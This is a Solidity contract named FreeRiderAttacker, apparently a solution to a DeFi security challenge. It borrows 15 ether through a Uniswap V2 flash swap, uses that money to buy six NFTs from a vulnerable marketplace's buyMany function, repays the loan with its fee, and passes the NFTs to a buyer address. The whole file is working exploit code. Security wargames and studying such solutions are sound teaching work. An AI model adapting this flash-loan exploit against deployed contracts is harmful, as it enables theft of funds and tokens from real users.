pragma solidity ^0.8.0;
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

import "@openzeppelin/contracts/utils/Address.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;

    IWETH private immutable weth;
    IUniswapV2Pair private pair;
    IERC721 private immutable nft;
    address private immutable buyer;

    constructor(
        address _buyer,
        address _pair,
        address _nft,
        address _weth
    ) {
        buyer = _buyer;
        pair = IUniswapV2Pair(_pair);
        nft = IERC721(_nft);
        weth = IWETH(_weth);
    }

    function attack(address _nftMarketPlace) external {
        pair.swap(15 ether, 0, address(this), abi.encode(_nftMarketPlace));
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), buyer, i);
        }
    }

    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256,
        bytes calldata data
    ) external override {
        weth.withdraw(amount0);

        address marketPlace = abi.decode(data, (address));

        /// Cast [0,1,2,3,4,5] (uint8[6]) to uint256 memory
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i; i < tokenIds.length; i++) {
            tokenIds[i] = i;
        }

        payable(marketPlace).functionCallWithValue(
            abi.encodeWithSignature("buyMany(uint256[])", tokenIds),
            amount0
        );

        // amount borrowed + 0.3% fee
        uint256 amountToRepay = 1 + (amount0 * 1000) / 997;

        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);
    }

    // Accept ERC721 tokens
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
